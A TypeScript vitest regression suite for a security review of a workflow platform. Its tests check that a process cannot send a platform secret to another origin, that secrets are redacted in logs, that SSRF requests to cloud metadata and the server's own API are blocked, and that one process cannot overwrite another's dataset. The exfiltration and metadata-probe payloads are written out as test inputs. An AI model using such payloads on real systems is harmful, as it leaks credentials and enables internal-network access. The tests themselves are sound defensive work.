import http from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { setup, startTestServer, type TestServer } from './helpers.js';

// End-to-end regressions for Security Review B, reproducing the PoCs over the API.
let s: TestServer;
let hub: string;
let dana: TestServer['api'];
let sink: http.Server;
let sinkPort = 0;
let sinkHits = 0;

beforeAll(async () => {
  s = await startTestServer();
  await setup(s);
  await s.api('POST', '/demo/setup', {});
  hub = (await s.api('GET', '/platforms')).find((p: any) => p.kind === 'insights-hub').id;
  dana = await s.as('dana', 'Demo-password-1');
  sink = http.createServer((req, res) => {
    sinkHits++;
    res.end(JSON.stringify({ got: req.headers }));
  });
  await new Promise<void>((r) => sink.listen(0, '127.0.0.1', r));
  sinkPort = (sink.address() as AddressInfo).port;
});
afterAll(async () => {
  await new Promise<void>((r) => sink.close(() => r()));
  await s?.app.close();
});

const runYaml = async (text: string, bindings: Record<string, string> = {}) => {
  const p = await dana('POST', '/processes', { text });
  const r = await dana('POST', '/runs', { processId: p.id, bindings });
  return s.waitRun(r.id);
};

describe('F2 – a designer cannot exfiltrate a platform secret', () => {
  it('blocks a secret templated into a request to another origin', async () => {
    sinkHits = 0;
    const run = await runYaml(`
name: exfil attempt
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - id: h
    type: http
    connection: hub
    method: GET
    path: "http://127.0.0.1:${sinkPort}/exfil"
    headers:
      x-leak: "{{ $secret('hub','clientSecret') }}"
`, { hub });
    expect(run.status).toBe('failed');
    expect(sinkHits).toBe(0);
  });

  it('redacts a secret even in a base64-encoded log', async () => {
    const run = await runYaml(`
name: log b64
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - id: l
    type: log
    message: "b64: {{ $base64encode($secret('hub','clientSecret')) }}"
`, { hub });
    const detail = await dana('GET', `/runs/${run.id}`);
    const logs = (detail.logs ?? []).map((l: any) => l.message).join('\n');
    expect(logs).not.toContain('ZGVtby1zZWNyZXQ='); // base64 of demo-secret
    expect(logs).toContain('***');
  });
});

describe('F4 – SSRF policy on the http node', () => {
  it('blocks cloud metadata and the server\'s own API, allows the platform', async () => {
    // default policy: nothing allow-listed (the demo allow-lists loopback, reset it here)
    await s.api('PUT', '/settings', { outboundAllowList: [] });
    const meta = await runYaml(`
name: metadata
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - { id: h, type: http, connection: hub, method: GET, path: "http://169.254.169.254/latest/meta-data/" }
`, { hub });
    expect(meta.status).toBe('failed');

    const ownApi = await runYaml(`
name: self call
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${s.base.split(':').pop()}/api/platforms" }
`, { hub });
    expect(ownApi.status).toBe('failed');

    const unconfigured = await runYaml(`
name: random host
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${sinkPort}/x" }
`, { hub });
    expect(unconfigured.status).toBe('failed');
  });

  it('an admin allow-list opens a specific origin', async () => {
    await s.api('PUT', '/settings', { outboundAllowList: [`http://127.0.0.1:${sinkPort}`] });
    sinkHits = 0;
    const run = await runYaml(`
name: allowed host
connections: [{ slot: hub, kind: insights-hub }]
steps:
  - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${sinkPort}/ok", onError: continue }
`, { hub });
    expect(sinkHits).toBeGreaterThan(0);
    await s.api('PUT', '/settings', { outboundAllowList: [] });
    void run;
  });
});

describe('F5 – cross-process dataset overwrite', () => {
  it('rejects a publish to a key owned by another process', async () => {
    const { publishDataset } = await import('../src/dashboards/datasets.js');
    const base = {
      title: 'T',
      processName: 'P',
      runId: 'run_x',
      dryRun: false,
      columns: ['value'],
      rows: [{ value: '1' }],
      metrics: {},
    };
    publishDataset({ key: 'review.owned', processId: 'proc-A', ...base });
    expect(() => publishDataset({ key: 'review.owned', processId: 'proc-B', ...base })).toThrow(/owned by/i);
    // the owner may keep writing
    expect(() => publishDataset({ key: 'review.owned', processId: 'proc-A', ...base })).not.toThrow();
  });

  it('after an admin deletes the dataset, another process may claim the key', async () => {
    const { publishDataset } = await import('../src/dashboards/datasets.js');
    await s.api('DELETE', '/datasets/review.owned');
    const base = { title: 'T', processName: 'P', runId: 'run_y', dryRun: false, columns: ['value'], rows: [{ value: '1' }], metrics: {} };
    expect(() => publishDataset({ key: 'review.owned', processId: 'proc-B', ...base })).not.toThrow();
  });
});
